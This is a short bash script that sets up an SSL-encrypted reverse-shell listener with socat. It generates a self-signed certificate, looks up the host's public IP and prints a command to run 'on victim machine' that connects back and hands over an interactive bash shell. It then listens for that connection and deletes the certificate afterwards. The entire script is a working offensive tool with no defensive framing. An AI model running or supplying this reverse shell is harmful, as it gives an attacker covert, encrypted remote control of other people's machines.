#!/usr/bin/env bash

# Author : shahril96
# Licensed under the WTFPL license - http://www.wtfpl.net/about/

# Make sure only root can run our script
[[ $EUID -ne 0 ]] && { echo "This script must be run as root" 1>&2; exit 1; }

# print help msg if not enough argument given
[ $# -ne 1 ] && { echo "Usage: `basename $0` port-to-listen"; exit 1; }

# check for internet connection
wget -q --tries=10 --timeout=20 --spider http://google.com
[ $? != 0 ] && { echo "Your current connection is offline, plz make sure you have internet connection"; exit 1; }

command -v socat >/dev/null 2>&1 || { echo >&2 "'socat' isnt available inside ur system, abort operation!!"; exit 1; }

if [[ ! -f server.pem ]]; then
    
    command -v openssl >/dev/null 2>&1 || { echo >&2 "'openssl' isnt available inside ur system, abort operation!!"; exit 1; }

    echo -e "\n[+] generating new ssl cert & priv.key\n"
    openssl req -x509 -sha256 -newkey rsa:4096 -keyout server.pem -out server.pem -days 10000 -nodes
fi

# get this computer public ip
ip=$(wget http://ipinfo.io/ip -qO - 2> /dev/null)

echo -e "\n[+] now on victim machine, run below command"
echo -e "$ ./socat openssl-connect:$ip:$1,verify=0 exec:bash,pty,stderr,setsid\n"

echo "[+] listening on port $1"
socat `tty`,raw,echo=0 openssl-listen:$1,reuseaddr,cert=server.pem,verify=0

echo "[+] clearing ur ugly ass (by deleting server.pem)"
rm -rf server.pem

exit
